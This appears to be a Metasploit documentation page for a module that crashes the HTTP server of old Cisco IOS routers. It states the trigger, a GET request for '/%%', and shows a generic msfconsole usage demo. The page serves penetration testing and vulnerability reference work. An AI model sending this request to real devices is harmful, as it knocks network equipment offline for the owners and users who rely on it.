## Cisco IOS HTTP GET /%% Request Denial of Service

This module triggers a Denial of Service condition in the 
Cisco IOS HTTP server. By sending a GET request for "/%%", 
the device becomes unresponsive. IOS 11.1 -> 12.1 are 
reportedly vulnerable. This module tested successfully 
against a Cisco 1600 Router IOS v11.2(18)P.


## Module Name
auxiliary/dos/cisco/ios_http_percentpercent

## Authors
* patrick


## References
* http://www.securityfocus.com/bid/1154
* http://cvedetails.com/cve/2000-0380/
* http://www.osvdb.org/1302




## Platforms


## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use auxiliary/dos/cisco/ios_http_percentpercent
msf auxiliary(ios_http_percentpercent) > show targets
   ... a list of targets ...
msf auxiliary(ios_http_percentpercent) > set TARGET <target-id>
msf auxiliary(ios_http_percentpercent) > show options
   ... show and set options ...
msf auxiliary(ios_http_percentpercent) > run
```
    
    